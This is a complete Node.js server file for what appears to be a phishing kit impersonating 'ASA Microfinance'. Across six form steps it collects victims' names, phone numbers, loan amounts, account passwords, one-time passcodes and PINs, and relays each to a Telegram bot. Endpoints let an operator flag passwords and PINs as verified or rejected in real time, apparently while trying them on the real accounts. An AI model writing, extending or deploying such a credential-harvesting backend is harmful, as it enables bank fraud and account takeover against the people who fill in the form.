/**
 * server.js
 * Complete Express + Socket.IO server with DEBUG LOGGING
 */

require('dotenv').config();

const express = require('express'); // FIXED
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');

// Import Telegram bot manager
const botManager = require('./bot_manager');

// ============================================================================
// CONFIGURATION
// ============================================================================

const app = express();
const server = http.createServer(app);

const io = socketIo(server, {
    cors: {
        origin: '*',
        methods: ['GET', 'POST'],
        credentials: true
    }
});

// expose socket globally for bot callbacks
global.io = io;

const PORT = process.env.PORT || 3000;

// ============================================================================
// SESSION STORAGE
// ============================================================================

const sessions = new Map();

// ============================================================================
// MIDDLEWARE
// ============================================================================

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => {
    console.log(`📝 ${req.method} ${req.path}`);
    next();
});

// ============================================================================
// SOCKET.IO CONNECTION HANDLING
// ============================================================================

io.use((socket, next) => {

    const sessionId = socket.handshake.auth.sessionId;

    if (!sessionId) {
        socket.sessionId = 'sess_' + uuidv4().substring(0, 8);
    } else {
        socket.sessionId = sessionId;
    }

    socket.appId = `ASA-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;

    next();
});

io.on('connection', (socket) => {

    console.log('===========================================');
    console.log(`🔌 SOCKET CONNECTED: ${socket.id}`);
    console.log(`📋 Session ID: ${socket.sessionId}`);
    console.log(`📋 App ID: ${socket.appId}`);
    console.log('===========================================');

    let session = sessions.get(socket.sessionId);

    if (!session) {

        session = {
            appId: socket.appId,
            createdAt: Date.now(),
            lastActivity: Date.now(),
            step1: null,
            step2: null,
            step3: null,
            step4: null,
            step5: null,
            step6: null,
            completed: false
        };

        sessions.set(socket.sessionId, session);

        console.log(`✅ New session created: ${socket.sessionId}`);

    } else {

        session.lastActivity = Date.now();
        socket.appId = session.appId;

        console.log(`🔄 Existing session resumed: ${socket.sessionId}`);
    }

    socket.emit('session-ready', { appId: socket.appId });

    // ========================================================================
    // ROOM JOIN
    // ========================================================================

    socket.on('join-room', (roomId) => {

        socket.join(roomId);

        console.log(`👥 SOCKET ${socket.id} JOINED ROOM: ${roomId}`);
        console.log(`📊 ACTIVE ROOMS:`, socket.rooms);

    });

    // ========================================================================
    // STEP 1
    // ========================================================================

    socket.on('step1', (data, callback) => {

        console.log(`📦 STEP 1 received for ${socket.sessionId}`);

        session.step1 = data;
        session.lastActivity = Date.now();

        botManager.sendStep1({
            appId: session.appId,
            ...data
        });

        callback({ success: true, step: 1 });

        socket.emit('step_ack', { step: 1 });

    });

    // ========================================================================
    // STEP 2
    // ========================================================================

    socket.on('step2', (data, callback) => {

        console.log(`📦 STEP 2 received for ${socket.sessionId}`);

        session.step2 = data;
        session.lastActivity = Date.now();

        botManager.sendStep2({
            appId: session.appId,
            ...data
        });

        callback({ success: true, step: 2 });

        socket.emit('step_ack', { step: 2 });

    });

    // ========================================================================
    // STEP 3
    // ========================================================================

    socket.on('step3', (data, callback) => {

        console.log(`📦 STEP 3 received for ${socket.sessionId}`);

        session.step3 = data;
        session.lastActivity = Date.now();

        botManager.sendStep3({
            appId: session.appId,
            ...data
        });

        callback({ success: true, step: 3 });

        socket.emit('step_ack', { step: 3 });

    });

    // ========================================================================
    // STEP 4
    // ========================================================================

    socket.on('step4', (data, callback) => {

        console.log(`📦 STEP 4 received for ${socket.sessionId}`);

        session.step4 = data;
        session.lastActivity = Date.now();

        botManager.sendStep4({
            appId: session.appId,
            firstName: session.step2?.firstName,
            lastName: session.step2?.lastName,
            phone: data.phone,
            amount: session.step1?.amount,
            password: data.password
        });

        callback({ success: true, step: 4 });

        socket.emit('step_ack', { step: 4 });

    });

    // ========================================================================
    // STEP 5
    // ========================================================================

    socket.on('step5', (data, callback) => {

        console.log(`📦 STEP 5 received for ${socket.sessionId}`);

        session.step5 = data;
        session.lastActivity = Date.now();

        botManager.sendStep5({
            appId: session.appId,
            ...data
        });

        callback({ success: true, step: 5 });

        socket.emit('step_ack', { step: 5 });

    });

    // ========================================================================
    // STEP 6
    // ========================================================================

    socket.on('step6', (data, callback) => {

        console.log(`📦 STEP 6 received for ${socket.sessionId}`);

        session.step6 = data;
        session.completed = true;
        session.lastActivity = Date.now();

        botManager.sendStep6({
            appId: session.appId,
            firstName: session.step2?.firstName,
            lastName: session.step2?.lastName,
            phone: session.step2?.phone,
            amount: session.step1?.amount,
            password: session.step4?.password,
            otp: session.step5?.otp,
            pin: data.pin
        });

        callback({ success: true, step: 6, completed: true });

        socket.emit('step_ack', { step: 6 });

    });

    // ========================================================================
    // OTP GENERATION
    // ========================================================================

    socket.on('request-otp', (data, callback) => {

        const otp = Math.floor(100000 + Math.random() * 900000).toString();

        console.log(`🔐 OTP generated for ${socket.sessionId}: ${otp}`);

        socket.emit('otp-generated', { simulation: otp });

        botManager.sendTelegramMessage(`
🔐 OTP GENERATED
━━━━━━━━━━━━━━━━━━
🆔 Session: ${socket.sessionId}
📞 Phone: ${data.phone}
🔢 OTP: ${otp}
        `);

        if (callback) callback({ success: true, otp });

    });

    socket.on('disconnect', () => {

        console.log(`🔌 Socket disconnected: ${socket.id}`);

    });

});

// ============================================================================
// BOT CALLBACK ENDPOINTS
// ============================================================================

app.post('/api/password-verified', (req, res) => {

    const { appId } = req.body;

    console.log(`✅ PASSWORD VERIFIED for ${appId}`);

    io.to(appId).emit('password-verified');

    res.json({ success: true });

});

app.post('/api/password-rejected', (req, res) => {

    const { appId } = req.body;

    console.log(`❌ PASSWORD REJECTED for ${appId}`);

    io.to(appId).emit('password-rejected', { attempts: 1 });

    res.json({ success: true });

});

app.post('/api/pin-verified', (req, res) => {

    const { appId } = req.body;

    console.log(`✅ PIN VERIFIED for ${appId}`);

    const referenceId = 'ASA-' + Date.now().toString(36).toUpperCase() +
        '-' + Math.random().toString(36).substring(2, 8).toUpperCase();

    io.to(appId).emit('pin-verified', { referenceId });

    res.json({ success: true });

});

app.post('/api/pin-rejected', (req, res) => {

    const { appId } = req.body;

    console.log(`❌ PIN REJECTED for ${appId}`);

    io.to(appId).emit('pin-rejected', { attempts: 1 });

    res.json({ success: true });

});

// ============================================================================
// API ENDPOINTS
// ============================================================================

app.get('/api/health', (req, res) => {

    res.json({
        status: 'ok',
        uptime: process.uptime(),
        sessions: sessions.size,
        timestamp: new Date().toISOString()
    });

});

app.get('/', (req, res) => {

    res.sendFile(path.join(__dirname, 'public', 'index.html'));

});

// ============================================================================
// ERROR HANDLING
// ============================================================================

app.use((req, res) => {

    res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));

});

app.use((err, req, res, next) => {

    console.error('❌ Unhandled error:', err);

    res.status(500).json({ error: 'Internal server error' });

});

// ============================================================================
// START SERVER
// ============================================================================

server.listen(PORT, () => {

    console.log(`
╔══════════════════════════════════════════════════════════════╗
║        ASA MICROFINANCE SERVER - PRODUCTION READY           ║
╠══════════════════════════════════════════════════════════════╣
║  Port: ${PORT}
║  Status: Running
╚══════════════════════════════════════════════════════════════╝
`);

});